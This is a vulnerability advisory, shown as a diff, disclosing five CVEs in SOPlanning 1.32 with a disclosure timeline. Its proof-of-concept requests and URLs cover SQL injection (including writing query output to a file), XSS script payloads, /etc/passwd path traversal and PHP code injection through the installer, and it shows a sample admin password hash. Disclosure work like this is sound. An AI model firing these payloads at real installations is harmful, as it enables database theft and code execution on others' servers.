@@ -1,0 +1,156 @@
+SOPlanning - Simple Online Planning Tool multiple vulnerabilities
+
+CVEs: CVE-2014-8673, CVE-2014-8674, CVE-2014-8675, CVE-2014-8676, CVE-2014-8677
+
+Vendor: http://www.soplanning.org/
+Product: SOPlanning - Simple Online Planning
+Version affected: 1.32 and prior
+
+Product description:
+SO Planning is an open source online planning tool completely free, designed to easily plan projects / tasks online, in order to manage and define work for a whole team. (from http://www.soplanning.org/en/index.php)
+
+Advisory introduction:
+Soplanning version 1.32 is susceptible to multiple vulnerabilities, including SQLi, XSS, path traversal, authentication information disclosure, PHP code injection.
+
+Credit: Huy-Ngoc DAU of Deloitte Conseil, France
+
+================================
+Finding 1: Soplanning multiple SQL injection vulnerabilities (CVE-2014-8673)
+================================
+- SQLi in planning.php
+The project, user, task filters are prone to SQLi due to lack of user input sanitization.
+
+POC :
+POST /process/planning.php HTTP/1.1
+Host: localhost
+Connection: keep-alive
+Content-Length: 141
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost/planning.php
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4,vi;q=0.2
+Cookie: soplanning=[VALID SESSION COOKIE]; inverserUsersProjets=1
+
+filtreGroupeProjet=1&projet_anything=anything') union all select 111,table_name,333,444,555,666,777,888,999 from information_schema.tables#
+
+The query's results can be retrieved by accessing http://localhost/export_csv.php
+
+
+- order by statement blind SQLi in user_list.php, projets.php, user_groupes.php, groupe_list.php
+POC:
+http://localhost/user_list.php?page=1&order=1,1&by=
+http://localhost/projets.php?order=1,0&by=
+http://localhost/user_groupes.php?page=1&order=1,(select%20case%20when%20(1=1)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by=
+http://localhost/groupe_list.php?page=1&order=1,(select%20case%20when%20(1=0)%20then%201%20else%201*(select%201%20from%20information_schema.tables)end)=1&by=
+
+
+- triPlanning GET parameter Blind SQLi in process/planning.php
+POC:
+http://localhost/process/planning.php?triPlanning=1,1
+and
+http://localhost/process/planning.php?triPlanning=1,0
+(don't follow redirection back to ../planning.php where the sanitization is done)
+
+The differences of TRUE and FALSE can be observed by accessing http://localhost/export_pdf.php?debug=1
+
+
+- SQLi in LIMIT statement in nb_lignes cookie
+POC: set the following cookie :
+nb_lignes=20 into outfile '/tmp/poc_soplanning.txt'
+and visit http://localhost/process/planning.php
+
+Sample file output content:
+ADM      \N          admin    admin    df5b909019c9b1659e86e0d6bf8da81d6fa3499e   \N          oui               000000  ["users_manage_all", "projects_manage_all", "projectgroups_manage_all", "tasks_modify_all", "tasks_view_all_projects", "parameters_all"]  [md5]    non        \N
+
+
+- insecure use of addslashes function to protect against SQLi
+Soplanning sanitizes user input to protect against SQLi by using PHP addslashes() function. However, this function is known to be unsafe. Instead, mysql_real_escape_string() should be used.
+
+================================
+Finding 2: Soplanning multiple XSS vulnerabilities (CVE-2014-8674)
+================================
+- XSS via cookie manipulation in unauthenticated mode (nb_mois, nb_lignes)
+This vulnerable allows for an attacker having physical access to a user's browser even in unauthenticated mode to steal the user's authenticated cookie.
+
+POC:
+Disconnect active user session
+At authentication page, set the following cookie: nb_mois="><script>alert(document.cookie)</script><"
+Login with any valid user account, an alert message will show the cookies.
+
+
+- Stored XSS in calender export functions
+Export functions offer a "debug" mode which outputs HTML instead of formatted content (pdf, ical). This mode can be activated by setting the "debug" GET parameter. However, by injecting malicious HTML code into a project name for example, it is possible to conduct XSS attacks.
+
+POC:
+Create a new project with the name <script>alert(1);</script>
+Access http://localhost/export_pdf.php?debug=1
+
+================================
+Finding 3: Soplanning authentication hash disclosure via GET URL in ICAL calender sharing function (CVE-2014-8675)
+================================
+Soplanning allows for an ICAL calendar to be shared/used elsewhere. However, the link is generated statically using authentication information.
+
+Sample generated link:
+http://localhost/export_ical.php?login=admin&hash=61b9bab17cdab06e759f2d11ee11afab
+
+An offline brute force attack can thus be conducted to find the user's password: hash = md5($user->login . '¤¤' . $user->password);
+
+================================
+Finding 4: Soplanning path traversal in Holidays calender import function (CVE-2014-8676)
+================================
+If error messages are activated, the vulnerability allows to detect existence of a remote arbitrary file.
+
+POC:
+http://localhost/process/feries.php?fichier=../../../../../../../etc/passwd
+
+Sample error output when file does not exist:
+Warning: file_get_contents(../../holidays/../../etc/passwd) [function.file-get-contents]: failed to open stream: No such file or directory in /[PATH]/includes/class_vcalendar.inc on line 1665
+
+However, it is not possible to retrieve file content or conduct further attack using this vulnerability.
+
+================================
+Finding 5: Soplanning PHP code injection in installation process (CVE-2014-8677)
+================================
+The installation process is prone to PHP code execution vulnerability.
+
+POC:
+ - Go to http://localhost/install
+- Enter valid database credentials and host information. The database name is as follows :
+ so';phpinfo();//
+- The next page will show the phpinfo() results
+
+It should be noted that in order for the attack to work, the attacker must prepare his own database server and the database user must either have access to a real database named "so';phpinfo();//", or have privileges to create any database.
+
+For installed instances of Soplanning, the attack is also possible (i.e. the installing interface is accessible) if:
+- PHP version is older than 5.2
+- Configured database server is (temporarily or not) down
+- The directory smarty/templates_c is not writable
+
+
+================================
+
+Timeline:
+03/08/2014 - Vulnerability discovered
+11/08/2014 - Vendor notified
+14/08/2014 - Vendor confirmed
+09/09/2014 - Patch released
+
+References:
+Soplanning changelog : http://www.soplanning.org/en/download.php
+
+
+About Deloitte:
+Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms. In France, Deloitte SAS is the member firm of Deloitte Touche Tohmatsu Limited, and professional services are provided by its subsidiaries and affiliates.
+Our Enterprise Risk Services practice is made up of over 11,000 professionals providing services relating to security, privacy & resilience; data governance and analytics; information and controls assurance; risk management technologies; and technology risk & governance. We help organizations build value by taking a "Risk Intelligent" approach to managing financial, technology, and business risks.
+
+Huy-Ngoc DAU
+Senior Consultant | IT Advisory
+Deloitte Conseil
+185, avenue Charles de Gaulle, Neuilly-sur-Seine, 92200, France
+Mobile: +33 (0)6 70 97 91 95  Tel: +33 (0)1 58 37 03 72
+hdau@deloitte.fr<mailto:hdau@deloitte.fr> | www.deloitte.fr<www.deloitte.com>
+
+Avant d'imprimer, pensez à l'environnement
